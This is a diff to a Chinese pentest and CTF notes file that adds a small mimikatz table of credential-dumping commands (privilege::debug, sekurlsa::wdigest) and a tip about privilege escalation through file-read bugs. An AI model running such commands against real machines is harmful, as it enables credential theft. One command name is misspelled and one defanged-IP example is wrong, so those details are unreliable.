@@ -32,6 +32,7 @@
   - [一些重要的命令](#一些重要的命令)
     - [curl命令](#curl命令)
     - [download](#download)
+    - [mimikatz](#mimikatz)
     - [sc](#sc)
     - [copy](#copy)
     - [find](#find)
@@ -559,6 +560,17 @@ windows:
 Invoke-WebRequest -Uri "http://IP:PORT/FILES" -OutFile "C:\FILES"
 ```
 
+### mimikatz
+
+mimikatz使用需要提权到administrator。
+
+命令| 描述
+|-|-| 
+privilege::debug |
+sekurlsa::wdigest |
+sekurlsa::USERNAEM |
+
+
 
 ### sc
 windows  
@@ -780,4 +792,5 @@ gzip:压缩和解压缩的工具，zcat命令可以读取压缩文件的内容
 - Linux的文件系统一定要非常了解，以便于识别出在根目录的其他文件夹
 - unkown的端口再扫一遍
 - ip地址的Defanged Version(去义版本)就是在.的左右加上中括号。ep：10.1.12.2的去义版本就是12[.]1[.]12[.]2
--
+- 妈的，还他妈可以用外面的漏洞提里面的权(任意文件读取漏洞提权)
+- 
